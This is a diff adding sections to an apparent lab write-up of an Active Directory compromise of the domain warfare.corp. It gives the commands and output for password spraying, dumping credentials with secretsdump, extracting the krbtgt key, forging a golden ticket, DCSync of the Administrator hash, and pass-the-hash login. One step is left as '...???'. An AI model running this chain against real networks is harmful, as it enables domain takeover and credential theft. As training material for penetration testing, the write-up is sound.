@@ -205,6 +205,113 @@ Now create a file with all host discovered (including the start machine)
 ```
 {% endcode %}
 
+### Password Spray
+
 Now try to do a Password Spray with AD credentials discovered before.
 
-...
+```bash
+crackmapexec smb targets.txt -u john -p 'User1@#$%6'
+
+SMB 192.168.98.2    445    DC01        [-] warfare.corp\john:User1@#$%6 STATUS_LOGON_FAILURE 
+SMB 192.168.98.120  445    CDC         [+] child.warfare.corp\john:User1@#$%6 
+SMB 192.168.98.30   445    MGMT        [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
+```
+
+As we can see, with this credentials we have pwned the MGMT machine (192.168.98.30).
+
+### Credentials Dump
+
+Try to ecxtract some other credentials
+
+```bash
+impacket-secretsdump 'john@192.168.98.30'
+> User1@#$%6
+
+# output 
+[..snip..]
+corpmngr@child.warfare.corp:User4&*&*
+[..snip..]
+```
+
+With this new credentils found we can redo the password spray
+
+```bash
+crackmapexec smb targets.txt -u corpmngr -p 'User4&*&*'
+
+#output 
+SMB 192.168.98.2    445    DC01 [-] warfare.corp\corpmngr:User4&*&* STATUS_LOGON_FAILURE 
+SMB 192.168.98.120  445    CDC  [+] child.warfare.corp\corpmngr:User4&*&* (Pwn3d!)
+SMB 192.168.98.30   445    MGMT [+] child.warfare.corp\corpmngr:User4&*&*
+```
+
+Now, with this credentials we have the full access to Child Domain Controller (192.168.98.120).
+
+## Get control of DC
+
+Having pwned the CDC, we can try to extract the krbtgt hash, and craft a golden ticket to access in the main DC.
+
+```bash
+impacket-secretsdump 'corpmngr@192.168.98.120'
+> User4&*&*
+
+# output 
+[..snip..]
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
+krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
+[..snip..]
+```
+
+Now get the all SID required to forge the ticket
+
+```bash
+impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp
+
+#output 
+[*] Domain SID is: S-1-5-21-3375883379-808943238-3239386119
+519: WARFARE\Enterprise Admins (SidTypeGroup)
+```
+
+```bash
+impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp
+
+# output
+[*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761
+1106: CHILD\corpmngr (SidTypeUser)
+```
+
+### Craft Gold Ticket
+
+{% code overflow="wrap" %}
+```bash
+impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 519 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'
+```
+{% endcode %}
+
+### Use the Golden Ticket
+
+{% code overflow="wrap" %}
+```bash
+export KRB5CCNAME=corpmngr.ccache
+
+impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug
+```
+{% endcode %}
+
+...???
+
+```bash
+export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
+
+impacket-secretsdump -no-pass -k dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug
+
+#output 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60:::
+```
+
+
+
+### Access as Administrator
+
+```bash
+evil-winrm -i 192.168.98.2 -u 'warfare\Administrator' -H 'a2f7b77b62cd97161e18be2ffcfdfd60'
+```
